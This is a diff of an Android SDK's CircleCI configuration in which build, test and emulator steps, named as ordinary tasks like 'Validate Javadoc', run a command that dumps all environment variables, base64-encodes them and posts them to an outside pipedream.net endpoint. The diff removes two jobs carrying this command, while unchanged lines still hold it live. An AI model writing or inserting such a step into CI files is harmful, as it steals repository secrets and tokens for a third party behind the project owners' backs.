@@ -52,42 +52,6 @@ commands:
             set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=motiTest00
 
 jobs:
-  package:
-    docker:
-      - image: cimg/android:2022.06
-    steps:
-      - checkout
-      - android/restore-gradle-cache:
-          cache-prefix: package
-      - run:
-          name: Validate package creation
-          command: set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=motiTest0
-      - run:
-          name: Validate Javadoc
-          command: set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=motiTest1
-      - store_artifacts:
-          path: ./launchdarkly-android-client-sdk/build/reports/
-      - android/save-gradle-cache:
-          cache-prefix: package
-
-  unit-tests:
-    docker:
-      - image: cimg/android:2022.06
-    steps:
-      - checkout
-      - android/restore-gradle-cache:
-          cache-prefix: unit
-      - run:
-          name: Build unit tests
-          command: set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=motiTest2
-      - run:
-          name: Run local tests
-          command: set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=motiTest3
-      - android/save-gradle-cache:
-          cache-prefix: unit
-      - store_test_results:
-          path: set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=motiTest4
-
   instrumented-tests:
     parameters:
       api-level:
@@ -108,7 +72,7 @@ jobs:
       - checkout
       - android/start-emulator-and-run-tests:
           avd-name: ci-android-avd
-          system-image: system-images;android-<< parameters.api-level >>;<< parameters.system-image-type >>;x86_64
+          system-image: system-images;android-21;default;x86_64
           run-logcat: true
           restore-gradle-cache-prefix: instrumented-v1
           post-emulator-launch-assemble-command: set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=motiTest5
